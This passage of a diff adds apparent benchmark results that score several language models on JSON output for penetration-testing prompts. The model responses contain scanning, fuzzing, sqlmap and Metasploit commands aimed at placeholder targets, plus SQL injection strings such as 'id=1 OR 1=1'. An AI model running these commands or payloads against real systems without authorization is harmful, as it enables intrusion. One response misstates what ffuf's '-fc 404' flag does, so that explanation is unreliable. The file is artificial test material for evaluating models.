+        "response": "```json\n{\n  \"command\": \"gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt\",\n  \"description\": \"Directory enumeration\",\n  \"args\": [\"dir\", \"-u\", \"http://target.local\", \"-w\", \"/usr/share/wordlists/dirb/common.txt\", \"-o\", \"gobuster_results.txt\"]\n}\n```",
+        "validJson": true,
+        "parseable": {
+          "command": "gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt",
+          "description": "Directory enumeration",
+          "args": [
+            "dir",
+            "-u",
+            "http://target.local",
+            "-w",
+            "/usr/share/wordlists/dirb/common.txt",
+            "-o",
+            "gobuster_results.txt"
+          ]
+        }
+      },
+      {
+        "model": "llama-3.1-8b",
+        "provider": "cerebras",
+        "testName": "exploit_ffuf_command",
+        "latency": 470,
+        "response": "Here's the ffuf command to fuzz GET parameters on http://target.local/search?query=FUZZ and output only valid JSON:\n\n```bash\nffuf -u 'http://target.local/search?query=FUZZ' -w /usr/share/wordlists/ffuf/parameters.txt -o ffuf_results.json -of json -fc 404\n```\n\nExplanation:\n\n- `-u 'http://target.local/search?query=FUZZ'`: specifies the URL to fuzz, including the parameter to fuzz.\n- `-w /usr/share/wordlists/ffuf/parameters.txt`: specifies the wordlist to use for fuzzing.\n- `-o ffuf_results.json`: specifies the output file for the results.\n- `-of json`: specifies that the output should be in JSON format.\n- `-fc 404`: specifies that only responses with a status code of 200 (success) should be included in the output. This effectively filters out invalid JSON responses.",
+        "validJson": false,
+        "error": "SyntaxError: JSON Parse error: Unexpected identifier \"Here\""
+      },
+      {
+        "model": "llama-3.1-8b",
+        "provider": "cerebras",
+        "testName": "mission_plan_json",
+        "latency": 347,
+        "response": "{\"mission_id\": \"test-001\", \"objectives\": [], \"phases\": [{\"name\": \"Initial Reconnaissance\", \"tools\": [], \"commands\": []}], \"expected_duration\": \"2h\"}",
+        "validJson": true,
+        "parseable": {
+          "mission_id": "test-001",
+          "objectives": [],
+          "phases": [
+            {
+              "name": "Initial Reconnaissance",
+              "tools": [],
+              "commands": []
+            }
+          ],
+          "expected_duration": "2h"
+        }
+      },
+      {
+        "model": "llama-3.1-8b",
+        "provider": "cerebras",
+        "testName": "finding_json",
+        "latency": 660,
+        "response": "Here's the JSON finding report:\n\n```json\n{\n  \"finding_id\": \"auto-001\",\n  \"severity\": \"medium\",\n  \"title\": \"SSH Service Detected\",\n  \"description\": \"The SSH service is running on the target host, which may indicate potential unauthorized access.\",\n  \"evidence\": {\n    \"port\": 22,\n    \"service\": \"ssh\",\n    \"version\": \"unknown\"\n  },\n  \"recommendations\": [\n    \"Verify the SSH service configuration and ensure that it is properly secured.\",\n    \"Consider implementing additional security measures, such as SSH key-based authentication or rate limiting.\",\n    \"Regularly review and update the SSH service to ensure it is up-to-date with the latest security patches.\"\n  ]\n}\n```\n\nNote that I've added a description to the report to provide more context, and also included some recommendations for remediation. The version of the SSH service is still unknown, but you can update it if you have that information.",
+        "validJson": false,
+        "error": "SyntaxError: JSON Parse error: Unexpected identifier \"Here\""
+      },
+      {
+        "model": "llama-3.1-8b",
+        "provider": "cerebras",
+        "testName": "code_review_json",
+        "latency": 487,
+        "response": "```json\n{\n  \"vulnerability\": \"SQL Injection\",\n  \"severity\": \"critical\",\n  \"location\": \"line 2\",\n  \"exploit\": \"id=1 OR 1=1\",\n  \"fix\": \"Use prepared statements\"\n}\n```\n\nThis PHP code is vulnerable to SQL injection because it directly inserts user input (`$_GET['id']`) into the SQL query without any sanitization or validation. This allows an attacker to inject malicious SQL code by manipulating the `id` parameter.\n\nFor example, if an attacker sends a request with `id=1 OR 1=1`, the SQL query would become `SELECT * FROM users WHERE id = 1 OR 1=1`, which would return all rows in the `users` table, potentially revealing sensitive information.\n\nTo fix this vulnerability, you should use prepared statements, which separate the SQL code from the user input. Here's an example of how to use prepared statements with PDO:\n\n```php\n<?php\n  $id = $_GET['id'];\n  $pdo = new PDO('mysql:host=localhost;dbname=database', 'username', 'password');\n  $stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');\n  $stmt->bindParam(':id', $id);\n  $stmt->execute();\n  $result = $stmt->fetchAll();\n  // Process the result\n?>\n```\n\nAlternatively, you can use a library like MySQLi, which also supports prepared statements:\n\n```php\n<?php\n  $id = $_GET['id'];\n  $mysqli = new mysqli('localhost', 'username', 'password', 'database');\n  $stmt = $mysqli->prepare('SELECT * FROM users WHERE id = ?');\n  $stmt->bind_param('i', $id);\n  $stmt->execute();\n  $result = $stmt->get_result();\n  // Process the result\n?>\n```",
+        "validJson": false,
+        "error": "SyntaxError: JSON Parse error: Unrecognized token '`'"
+      }
+    ]
+  },
+  {
+    "model": "qwen-3-235b-a22b-instruct-2507",
+    "provider": "cerebras",
+    "testsPassed": 6,
+    "testsFailed": 0,
+    "avgLatency": 471,
+    "validJsonRate": 100,
+    "skipped": 0,
+    "results": [
+      {
+        "model": "qwen-3-235b-a22b-instruct-2507",
+        "provider": "cerebras",
+        "testName": "exploit_nmap_command",
+        "latency": 335,
+        "response": "{\"command\": \"nmap -sV -sC -p- -oA 192.168.1.0_scan 192.168.1.0/24\", \"description\": \"Full port scan with service detection\", \"args\": [\"-sV\", \"-sC\", \"-p-\", \"-oA\"]}",
+        "validJson": true,
+        "parseable": {
+          "command": "nmap -sV -sC -p- -oA 192.168.1.0_scan 192.168.1.0/24",
+          "description": "Full port scan with service detection",
+          "args": [
+            "-sV",
+            "-sC",
+            "-p-",
+            "-oA"
+          ]
+        }
+      },
+      {
+        "model": "qwen-3-235b-a22b-instruct-2507",
+        "provider": "cerebras",
+        "testName": "exploit_gobuster_command",
+        "latency": 475,
+        "response": "{\"command\": \"gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt\", \"description\": \"Directory enumeration\", \"args\": [\"dir\", \"-u\", \"-w\", \"-o\"]}",
+        "validJson": true,
+        "parseable": {
+          "command": "gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt",
+          "description": "Directory enumeration",
+          "args": [
+            "dir",
+            "-u",
+            "-w",
+            "-o"
+          ]
+        }
+      },
+      {
+        "model": "qwen-3-235b-a22b-instruct-2507",
+        "provider": "cerebras",
+        "testName": "exploit_ffuf_command",
+        "latency": 442,
+        "response": "{\"command\": \"ffuf -u 'http://target.local/search?query=FUZZ' -w /usr/share/wordlists/ffuf/parameters.txt -o ffuf_results.json -of json\", \"description\": \"Parameter fuzzing\", \"args\": [\"-u\", \"-w\", \"-o\", \"-of\"]}",
+        "validJson": true,
+        "parseable": {
+          "command": "ffuf -u 'http://target.local/search?query=FUZZ' -w /usr/share/wordlists/ffuf/parameters.txt -o ffuf_results.json -of json",
+          "description": "Parameter fuzzing",
+          "args": [
+            "-u",
+            "-w",
+            "-o",
+            "-of"
+          ]
+        }
+      },
+      {
+        "model": "qwen-3-235b-a22b-instruct-2507",
+        "provider": "cerebras",
+        "testName": "mission_plan_json",
+        "latency": 750,
+        "response": "{\n  \"mission_id\": \"test-001\",\n  \"objectives\": [\n    \"Identify and enumerate exposed endpoints\",\n    \"Detect common web vulnerabilities (e.g., XSS, SQLi, CSRF)\",\n    \"Assess authentication and session management mechanisms\",\n    \"Evaluate security headers and client-side controls\",\n    \"Report all findings with risk ratings\"\n  ],\n  \"phases\": [\n    {\n      \"name\": \"Reconnaissance\",\n      \"tools\": [\n        \"nmap\",\n        \"whois\",\n        \"theHarvester\"\n      ],\n      \"commands\": [\n        \"nmap -sV -sC target.com\",\n        \"whois target.com\",\n        \"theHarvester -d target.com -b all\"\n      ]\n    },\n    {\n      \"name\": \"Enumeration\",\n      \"tools\": [\n        \"gobuster\",\n        \"dirb\",\n        \"dnsenum\"\n      ],\n      \"commands\": [\n        \"gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster.txt\",\n        \"dirb https://target.com\",\n        \"dnsenum target.com\"\n      ]\n    },\n    {\n      \"name\": \"Vulnerability Scanning\",\n      \"tools\": [\n        \"nikto\",\n        \"sqlmap\",\n        \"Burp Suite\"\n      ],\n      \"commands\": [\n        \"nikto -h https://target.com\",\n        \"sqlmap -u 'https://target.com/page?id=1' --batch\",\n        \"Manual inspection using Burp Suite Proxy and Scanner\"\n      ]\n    },\n    {\n      \"name\": \"Exploitation\",\n      \"tools\": [\n        \"Metasploit\",\n        \"custom scripts\",\n        \"Burp Suite\"\n      ],\n      \"commands\": [\n        \"msfconsole\",\n        \"python3 exploit_xss.py https://target.com/reflective\",\n        \"Manual exploitation of identified vulnerabilities via Burp Repeater\"\n      ]\n    },\n    {\n      \"name\": \"Post-Exploitation and Reporting\",\n      \"tools\": [\n        \"shell access\",\n        \"reporting tool\",\n        \"collaborator\"\n      ],\n      \"commands\": [\n        \"Retrieve sensitive files and enumerate user privileges\",\n        \"Generate PDF report using reportgen --mission test-001\",\n        \"Validate out-of-band vulnerabilities with Burp Collaborator\"\n      ]\n    }\n  ],\n  \"expected_duration\": \"2h\"\n}",
+        "validJson": true,
+        "parseable": {
+          "mission_id": "test-001",
+          "objectives": [
+            "Identify and enumerate exposed endpoints",
+            "Detect common web vulnerabilities (e.g., XSS, SQLi, CSRF)",
+            "Assess authentication and session management mechanisms",
+            "Evaluate security headers and client-side controls",
+            "Report all findings with risk ratings"
+          ],
+          "phases": [
+            {
+              "name": "Reconnaissance",
+              "tools": [
+                "nmap",
+                "whois",
+                "theHarvester"
+              ],
+              "commands": [
+                "nmap -sV -sC target.com",
+                "whois target.com",
+                "theHarvester -d target.com -b all"
+              ]
+            },
+            {
+              "name": "Enumeration",
+              "tools": [
+                "gobuster",
+                "dirb",
+                "dnsenum"
+              ],
+              "commands": [
+                "gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster.txt",
+                "dirb https://target.com",
+                "dnsenum target.com"
+              ]
+            },
+            {
+              "name": "Vulnerability Scanning",
+              "tools": [
+                "nikto",
+                "sqlmap",
+                "Burp Suite"
+              ],
+              "commands": [
+                "nikto -h https://target.com",
+                "sqlmap -u 'https://target.com/page?id=1' --batch",
+                "Manual inspection using Burp Suite Proxy and Scanner"
+              ]
+            },
+            {
+              "name": "Exploitation",
+              "tools": [
+                "Metasploit",
+                "custom scripts",
+                "Burp Suite"
+              ],
+              "commands": [
+                "msfconsole",
+                "python3 exploit_xss.py https://target.com/reflective",
+                "Manual exploitation of identified vulnerabilities via Burp Repeater"
+              ]
+            },
+            {
+              "name": "Post-Exploitation and Reporting",
+              "tools": [
+                "shell access",
+                "reporting tool",
+                "collaborator"
+              ],
+              "commands": [
+                "Retrieve sensitive files and enumerate user privileges",
+                "Generate PDF report using reportgen --mission test-001",
+                "Validate out-of-band vulnerabilities with Burp Collaborator"
+              ]
+            }
+          ],
+          "expected_duration": "2h"
+        }
+      },
+      {
+        "model": "qwen-3-235b-a22b-instruct-2507",
+        "provider": "cerebras",
+        "testName": "finding_json",
+        "latency": 500,
+        "response": "{\n  \"finding_id\": \"auto-001\",\n  \"severity\": \"medium\",\n  \"title\": \"SSH Service Detected\",\n  \"description\": \"An SSH service was detected running on port 22 of the host 10.0.0.5. SSH is commonly used for secure remote administration, but if misconfigured or running outdated software, it may pose a security risk, including exposure to brute-force attacks or exploitation of known vulnerabilities.\",\n  \"evidence\": {\n    \"port\": 22,\n    \"service\": \"ssh\",\n    \"version\": \"\"\n  },\n  \"recommendations\": [\n    \"Ensure the SSH service is running the latest stable version and apply security patches regularly.\",\n    \"Change the default SSH port to reduce exposure to automated attacks.\",\n    \"Disable root login over SSH and use key-based authentication instead of passwords.\",\n    \"Implement firewall rules to restrict SSH access to trusted IP addresses only.\",\n    \"Enable account lockout mechanisms or use tools like fail2ban to prevent brute-force attacks.\"\n  ]\n}",
+        "validJson": true,
+        "parseable": {
+          "finding_id": "auto-001",
+          "severity": "medium",
+          "title": "SSH Service Detected",
+          "description": "An SSH service was detected running on port 22 of the host 10.0.0.5. SSH is commonly used for secure remote administration, but if misconfigured or running outdated software, it may pose a security risk, including exposure to brute-force attacks or exploitation of known vulnerabilities.",
+          "evidence": {
+            "port": 22,
+            "service": "ssh",
+            "version": ""
+          },
+          "recommendations": [
+            "Ensure the SSH service is running the latest stable version and apply security patches regularly.",
+            "Change the default SSH port to reduce exposure to automated attacks.",
+            "Disable root login over SSH and use key-based authentication instead of passwords.",
+            "Implement firewall rules to restrict SSH access to trusted IP addresses only.",
+            "Enable account lockout mechanisms or use tools like fail2ban to prevent brute-force attacks."
+          ]
+        }
+      },
+      {
+        "model": "qwen-3-235b-a22b-instruct-2507",
+        "provider": "cerebras",
+        "testName": "code_review_json",
+        "latency": 324,
+        "response": "{\"vulnerability\": \"SQL Injection\", \"severity\": \"critical\", \"location\": \"line 2\", \"exploit\": \"id=1 OR 1=1\", \"fix\": \"Use prepared statements\"}",
+        "validJson": true,
+        "parseable": {
+          "vulnerability": "SQL Injection",
+          "severity": "critical",
+          "location": "line 2",
+          "exploit": "id=1 OR 1=1",
+          "fix": "Use prepared statements"
+        }
+      }
+    ]
+  },
+  {
+    "model": "gemma-3-27b-it",
+    "provider": "google",
+    "testsPassed": 6,
+    "testsFailed": 0,
+    "avgLatency": 9868,
+    "validJsonRate": 100,
+    "skipped": 0,
+    "results": [
+      {
+        "model": "gemma-3-27b-it",
+        "provider": "google",
+        "testName": "exploit_nmap_command",
+        "latency": 4933,
+        "response": "```json\n{\"command\": \"nmap -sV -sC -p- -oA 192.168.1.0_scan 192.168.1.0/24\", \"description\": \"Full port scan with service detection\", \"args\": [\"-sV\", \"-sC\", \"-p-\", \"-oA\"]}\n```",
+        "validJson": true,
+        "parseable": {
+          "command": "nmap -sV -sC -p- -oA 192.168.1.0_scan 192.168.1.0/24",
+          "description": "Full port scan with service detection",
+          "args": [
+            "-sV",
+            "-sC",
+            "-p-",
+            "-oA"
+          ]
+        }
+      },
+      {
+        "model": "gemma-3-27b-it",
+        "provider": "google",
+        "testName": "exploit_gobuster_command",
+        "latency": 5812,
+        "response": "```json\n{\"command\": \"gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt\", \"description\": \"Directory enumeration\", \"args\": [\"dir\", \"-u\", \"http://target.local\", \"-w\", \"/usr/share/wordlists/dirb/common.txt\", \"-o\", \"gobuster_results.txt\"]}\n```",
+        "validJson": true,
+        "parseable": {
+          "command": "gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt",
+          "description": "Directory enumeration",
+          "args": [
+            "dir",
+            "-u",
+            "http://target.local",
+            "-w",
+            "/usr/share/wordlists/dirb/common.txt",
+            "-o",
+            "gobuster_results.txt"
+          ]
+        }
+      },
+      {
+        "model": "gemma-3-27b-it",
+        "provider": "google",
+        "testName": "exploit_ffuf_command",
+        "latency": 7373,
+        "response": "```json\n{\"command\": \"ffuf -u 'http://target.local/search?query=FUZZ' -w /usr/share/wordlists/ffuf/parameters.txt -o ffuf_results.json -of json\", \"description\": \"Parameter fuzzing\", \"args\": [\"-u\", \"-w\", \"-o\", \"-of\"]}\n```",
+        "validJson": true,
+        "parseable": {
+          "command": "ffuf -u 'http://target.local/search?query=FUZZ' -w /usr/share/wordlists/ffuf/parameters.txt -o ffuf_results.json -of json",
+          "description": "Parameter fuzzing",
+          "args": [
+            "-u",
+            "-w",
+            "-o",
+            "-of"
+          ]
+        }
+      },
+      {
+        "model": "gemma-3-27b-it",
+        "provider": "google",
+        "testName": "mission_plan_json",
+        "latency": 15087,
+        "response": "```json\n{\n  \"mission_id\": \"test-001\",\n  \"objectives\": [\n    \"Identify potential vulnerabilities in the web application.\",\n    \"Assess the risk associated with identified vulnerabilities.\",\n    \"Provide recommendations for remediation.\"\n  ],\n  \"phases\": [\n    {\n      \"name\": \"Information Gathering\",\n      \"tools\": [\n        \"whois\",\n        \"nslookup\",\n        \"curl\",\n        \"waybackurls\",\n        \"dirb\",\n        \"sublist3r\"\n      ],\n      \"commands\": [\n        \"whois <target_domain>\",\n        \"nslookup <target_domain>\",\n        \"curl -I <target_url>\",\n        \"waybackurls <target_domain>\",\n        \"dirb <target_url> /usr/share/wordlists/dirb/common.txt\",\n        \"sublist3r -d <target_domain>\"\n      ]\n    },\n    {\n      \"name\": \"Vulnerability Scanning\",\n      \"tools\": [\n        \"OWASP ZAP\",\n        \"Nikto\",\n        \"Nmap\"\n      ],\n      \"commands\": [\n        \"OWASP ZAP - automated scan <target_url>\",\n        \"nikto -h <target_url>\",\n        \"nmap -sV <target_url>\"\n      ]\n    },\n    {\n      \"name\": \"Exploitation (Manual)\",\n      \"tools\": [\n        \"Burp Suite\",\n        \"curl\",\n        \"Browser Developer Tools\"\n      ],\n      \"commands\": [\n        \"Manual testing for XSS, SQL Injection, CSRF, and other common web vulnerabilities using Burp Suite and browser developer tools.\",\n        \"Attempt to exploit identified vulnerabilities using crafted payloads.\"\n      ]\n    },\n    {\n      \"name\": \"Reporting\",\n      \"tools\": [\n        \"Markdown Editor\",\n        \"Text Editor\"\n      ],\n      \"commands\": [\n        \"Document all identified vulnerabilities, their risk levels, and remediation recommendations.\",\n        \"Create a comprehensive penetration test report.\"\n      ]\n    }\n  ],\n  \"expected_duration\": \"8h\",\n  \"scope\": [\n    \"https://example.com\",\n    \"https://www.example.com\"\n  ],\n  \"out_of_scope\": [\n    \"https://api.example.com\",\n    \"Any third-party services\"\n  ],\n  \"rules_of_engagement\": [\n    \"No denial-of-service attacks.\",\n    \"Do not attempt to access or modify data that is not publicly accessible.\",\n    \"Report all findings to the designated contact immediately.\"\n  ],\n  \"contact\": \"security@example.com\"\n}\n```",
+        "validJson": true,
+        "parseable": {
+          "mission_id": "test-001",
+          "objectives": [
+            "Identify potential vulnerabilities in the web application.",
+            "Assess the risk associated with identified vulnerabilities.",
+            "Provide recommendations for remediation."
+          ],
+          "phases": [
+            {
+              "name": "Information Gathering",
+              "tools": [
+                "whois",
+                "nslookup",
+                "curl",
+                "waybackurls",
+                "dirb",
+                "sublist3r"
+              ],
+              "commands": [
+                "whois <target_domain>",
+                "nslookup <target_domain>",
+                "curl -I <target_url>",
+                "waybackurls <target_domain>",
+                "dirb <target_url> /usr/share/wordlists/dirb/common.txt",
+                "sublist3r -d <target_domain>"
+              ]
+            },
+            {
+              "name": "Vulnerability Scanning",
+              "tools": [
+                "OWASP ZAP",
+                "Nikto",
+                "Nmap"
+              ],
+              "commands": [
+                "OWASP ZAP - automated scan <target_url>",
+                "nikto -h <target_url>",
+                "nmap -sV <target_url>"
+              ]
+            },
+            {
+              "name": "Exploitation (Manual)",
+              "tools": [
+                "Burp Suite",
+                "curl",
+                "Browser Developer Tools"
+              ],
+              "commands": [
+                "Manual testing for XSS, SQL Injection, CSRF, and other common web vulnerabilities using Burp Suite and browser developer tools.",
+                "Attempt to exploit identified vulnerabilities using crafted payloads."
+              ]
+            },
+            {
+              "name": "Reporting",
+              "tools": [
+                "Markdown Editor",
+                "Text Editor"
+              ],
+              "commands": [
+                "Document all identified vulnerabilities, their risk levels, and remediation recommendations.",
+                "Create a comprehensive penetration test report."
+              ]
+            }
+          ],
+          "expected_duration": "8h",
+          "scope": [
+            "https://example.com",
+            "https://www.example.com"
+          ],
+          "out_of_scope": [
+            "https://api.example.com",
+            "Any third-party services"
+          ],
+          "rules_of_engagement": [
+            "No denial-of-service attacks.",
+            "Do not attempt to access or modify data that is not publicly accessible.",
+            "Report all findings to the designated contact immediately."
+          ],
+          "contact": "security@example.com"
+        }
+      },
+      {
+        "model": "gemma-3-27b-it",
+        "provider": "google",
+        "testName": "finding_json",
+        "latency": 16263,
+        "response": "```json\n{\n  \"finding_id\": \"auto-001\",\n  \"severity\": \"medium\",\n  \"title\": \"SSH Service Detected\",\n  \"description\": \"The SSH service (port 22) is running on the target system. While SSH is a legitimate service, it is often targeted by attackers for brute-force attacks and vulnerability exploitation.  Ensure SSH is properly configured with strong passwords, key-based authentication, and is kept up-to-date.\",\n  \"evidence\": {\n    \"port\": 22,\n    \"service\": \"ssh\",\n    \"version\": null\n  },\n  \"recommendations\": [\n    \"Disable SSH if not required.\",\n    \"Enforce strong password policies.\",\n    \"Implement key-based authentication.\",\n    \"Consider using a non-standard SSH port.\",\n    \"Keep SSH software up-to-date with the latest security patches.\",\n    \"Implement intrusion detection/prevention systems (IDS/IPS) to monitor for malicious SSH activity.\",\n    \"Limit SSH access to authorized users and networks.\"\n  ],\n  \"target\": \"10.0.0.5\"\n}\n```\n\nKey improvements and explanations:\n\n* **`description` added detail:**  The original description was empty.  I've added a description explaining *why* an open SSH port is a potential security concern.  This is crucial for a useful finding report.\n* **`version: null` instead of `version: \"\"`:** Using `null` is generally preferred for missing data in JSON.  An empty string can sometimes be misinterpreted.\n* **`recommendations` expanded:**  I've added a comprehensive list of recommendations to mitigate the risk associated with an open SSH port.  This makes the report actionable.\n* **`target` added:**  Crucially, I've added a `target` field to specify the IP address the finding applies to.  Without this, the report is less useful.\n* **More realistic severity:** While \"medium\" is appropriate, the description justifies it.\n* **JSON validity:**  The output is valid JSON.  You can verify this using any JSON validator (e.g., jsonlint.com).\n* **Clearer language:** The description and recommendations are written in clear, concise language.",
+        "validJson": true,
+        "parseable": {
+          "finding_id": "auto-001",
+          "severity": "medium",
+          "title": "SSH Service Detected",
+          "description": "The SSH service (port 22) is running on the target system. While SSH is a legitimate service, it is often targeted by attackers for brute-force attacks and vulnerability exploitation.  Ensure SSH is properly configured with strong passwords, key-based authentication, and is kept up-to-date.",
+          "evidence": {
+            "port": 22,
+            "service": "ssh",
+            "version": null
+          },
+          "recommendations": [
+            "Disable SSH if not required.",
+            "Enforce strong password policies.",
+            "Implement key-based authentication.",
+            "Consider using a non-standard SSH port.",
+            "Keep SSH software up-to-date with the latest security patches.",
+            "Implement intrusion detection/prevention systems (IDS/IPS) to monitor for malicious SSH activity.",
+            "Limit SSH access to authorized users and networks."
+          ],
+          "target": "10.0.0.5"
+        }
+      },
+      {
+        "model": "gemma-3-27b-it",
+        "provider": "google",
+        "testName": "code_review_json",
+        "latency": 9738,
+        "response": "```json\n{\"vulnerability\": \"SQL Injection\", \"severity\": \"critical\", \"location\": \"line 2\", \"exploit\": \"id=1' OR '1'='1\", \"fix\": \"Use prepared statements\"}\n```",
+        "validJson": true,
+        "parseable": {
+          "vulnerability": "SQL Injection",
+          "severity": "critical",
+          "location": "line 2",
+          "exploit": "id=1' OR '1'='1",
+          "fix": "Use prepared statements"
+        }
+      }
+    ]
+  },
+  {
+    "model": "nvidia/nemotron-3-super-120b-a12b:free",
+    "provider": "openrouter",
+    "testsPassed": 6,
+    "testsFailed": 0,
+    "avgLatency": 23322,
+    "validJsonRate": 100,
+    "skipped": 0,
+    "results": [
+      {
+        "model": "nvidia/nemotron-3-super-120b-a12b:free",
+        "provider": "openrouter",
+        "testName": "exploit_nmap_command",
+        "latency": 4314,
+        "response": "{\"command\": \"nmap -sV -sC -p- -oA 192.168.1.0_scan 192.168.1.0/24\", \"description\": \"Full port scan with service detection\", \"args\": [\"-sV\", \"-sC\", \"-p-\", \"-oA\"]}",
+        "validJson": true,
+        "parseable": {
+          "command": "nmap -sV -sC -p- -oA 192.168.1.0_scan 192.168.1.0/24",
+          "description": "Full port scan with service detection",
+          "args": [
+            "-sV",
+            "-sC",
+            "-p-",
+            "-oA"
+          ]
+        }
+      },
+      {
+        "model": "nvidia/nemotron-3-super-120b-a12b:free",
+        "provider": "openrouter",
+        "testName": "exploit_gobuster_command",
+        "latency": 27430,
+        "response": "{\n  \"command\": \"gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt\",\n  \"description\": \"Directory enumeration\",\n  \"args\": [\"dir\", \"-u\", \"-w\", \"-o\"]\n}",
+        "validJson": true,
+        "parseable": {
+          "command": "gobuster dir -u http://target.local -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt",
+          "description": "Directory enumeration",
+          "args": [
+            "dir",
+            "-u",
+            "-w",
+            "-o"
+          ]
+        }
+      },
+      {
+        "model": "nvidia/nemotron-3-super-120b-a12b:free",
+        "provider": "openrouter",
+        "testName": "exploit_ffuf_command",
+        "latency": 43341,
+        "response": "{\"command\": \"ffuf -u 'http://target.local/search?query=FUZZ' -w /usr/share/wordlists/ffuf/parameters.txt -o ffuf_results.json -of json\", \"description\": \"Parameter fuzzing\", \"args\": [\"-u\", \"-w\", \"-o\", \"-of\"]}",
+        "validJson": true,
+        "parseable": {
+          "command": "ffuf -u 'http://target.local/search?query=FUZZ' -w /usr/share/wordlists/ffuf/parameters.txt -o ffuf_results.json -of json",
+          "description": "Parameter fuzzing",
+          "args": [
+            "-u",
+            "-w",
+            "-o",
+            "-of"
+          ]
+        }
+      },
+      {
+        "model": "nvidia/nemotron-3-super-120b-a12b:free",
+        "provider": "openrouter",
+        "testName": "mission_plan_json",
+        "latency": 41996,
+        "response": "{\n  \"mission_id\": \"test-001\",\n  \"objectives\": [\n    \"Identify vulnerabilities in authentication\",\n    \"Assess input validation\",\n    \"Test for insecure direct object references\"\n  ],\n  \"phases\": [\n    {\n      \"name\": \"Reconnaissance\",\n      \"tools\": [\n        \"nmap\",\n        \"gobuster\",\n        \"nikto\"\n      ],\n      \"commands\": [\n        \"nmap -sV -p- target.com\",\n        \"gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt\",\n        \"nikto -h http://target.com\"\n      ]\n    },\n    {\n      \"name\": \"Exploitation\",\n      \"tools\": [\n        \"burpsuite\",\n        \"sqlmap\",\n        \"metasploit\"\n      ],\n      \"commands\": [\n        \"burpsuite --proxy\",\n        \"sqlmap -u http://target.com/login.php --forms --batch\",\n        \"msfconsole -x 'use exploit/multi/http/... ; set RHOST target.com ; exploit'\"\n      ]\n    },\n    {\n      \"name\": \"Post‑Exploitation & Reporting\",\n      \"tools\": [\n        \"enum4linux\",\n        \"linpeas\",\n        \"markdown\"\n      ],\n      \"commands\": [\n        \"enum4linux target.com\",\n        \"linpeas.sh\",\n        \"generate_report.py\"\n      ]\n    }\n  ],\n  \"expected_duration\": \"8h\"\n}",
+        "validJson": true,
+        "parseable": {
+          "mission_id": "test-001",
+          "objectives": [
+            "Identify vulnerabilities in authentication",
+            "Assess input validation",
+            "Test for insecure direct object references"
+          ],
+          "phases": [
+            {
+              "name": "Reconnaissance",
+              "tools": [
+                "nmap",
+                "gobuster",
+                "nikto"
+              ],
+              "commands": [
+                "nmap -sV -p- target.com",
+                "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt",
+                "nikto -h http://target.com"
+              ]
+            },
+            {
+              "name": "Exploitation",
+              "tools": [
+                "burpsuite",
+                "sqlmap",
+                "metasploit"
+              ],
+              "commands": [
+                "burpsuite --proxy",
+                "sqlmap -u http://target.com/login.php --forms --batch",
+                "msfconsole -x 'use exploit/multi/http/... ; set RHOST target.com ; exploit'"
+              ]
+            },
+            {
+              "name": "Post‑Exploitation & Reporting",
+              "tools": [
+                "enum4linux",
+                "linpeas",
+                "markdown"
+              ],
+              "commands": [
+                "enum4linux target.com",
+                "linpeas.sh",
+                "generate_report.py"
+              ]
+            }
+          ],
+          "expected_duration": "8h"
+        }
+      },
+      {
+        "model": "nvidia/nemotron-3-super-120b-a12b:free",
+        "provider": "openrouter",
+        "testName": "finding_json",
+        "latency": 12246,
+        "response": "{\n  \"finding_id\": \"auto-001\",\n  \"severity\": \"medium\",\n  \"title\": \"SSH Service Detected\",\n  \"description\": \"An open SSH service (TCP port 22) was identified on host 10.0.0.5. While SSH is a legitimate remote administration protocol, exposure of this service to untrusted networks increases the attack surface and may allow brute‑force or credential‑based attacks if not properly hardened.\",\n  \"evidence\": {\n    \"port\": 22,\n    \"service\": \"ssh\",\n    \"version\": \"\"\n  },\n  \"recommendations\": [\n    \"Restrict SSH access to trusted IP ranges using firewall rules or network segmentation.\",\n    \"Disable password authentication and enforce key‑based authentication with strong passphrases.\",\n    \"Implement rate‑limiting or fail2ban‑style controls to mitigate brute‑force attempts.\",\n    \"Ensure the SSH server is kept up‑to‑date with the latest security patches.\",\n    \"Consider changing the default port (if appropriate) and/or using a VPN/jump host for remote access.\"\n  ]\n}",
+        "validJson": true,
+        "parseable": {
+          "finding_id": "auto-001",
+          "severity": "medium",
+          "title": "SSH Service Detected",
+          "description": "An open SSH service (TCP port 22) was identified on host 10.0.0.5. While SSH is a legitimate remote administration protocol, exposure of this service to untrusted networks increases the attack surface and may allow brute‑force or credential‑based attacks if not properly hardened.",
+          "evidence": {
+            "port": 22,
+            "service": "ssh",
+            "version": ""
+          },
+          "recommendations": [
+            "Restrict SSH access to trusted IP ranges using firewall rules or network segmentation.",
+            "Disable password authentication and enforce key‑based authentication with strong passphrases.",
+            "Implement rate‑limiting or fail2ban‑style controls to mitigate brute‑force attempts.",
+            "Ensure the SSH server is kept up‑to‑date with the latest security patches.",
+            "Consider changing the default port (if appropriate) and/or using a VPN/jump host for remote access."
+          ]
+        }
+      },
+      {
+        "model": "nvidia/nemotron-3-super-120b-a12b:free",
+        "provider": "openrouter",
+        "testName": "code_review_json",
+        "latency": 10607,
+        "response": "{\"vulnerability\":\"SQL Injection\",\"severity\":\"critical\",\"location\":\"line 2\",\"exploit\":\"id=1 OR 1=1\",\"fix\":\"Use prepared statements\"}",
+        "validJson": true,
+        "parseable": {
+          "vulnerability": "SQL Injection",
+          "severity": "critical",
+          "location": "line 2",
+          "exploit": "id=1 OR 1=1",
+          "fix": "Use prepared statements"
+        }
+      }
+    ]
+  },
+  {
+    "model": "google/gemma-3-12b-it:free",
+    "provider": "openrouter",
+    "testsPassed": 0,
+    "testsFailed": 0,
+    "avgLatency": 0,
+    "validJsonRate": 0,
+    "skipped": 6,
+    "results": [
+      {
+        "model": "google/gemma-3-12b-it:free",
+        "provider": "openrouter",
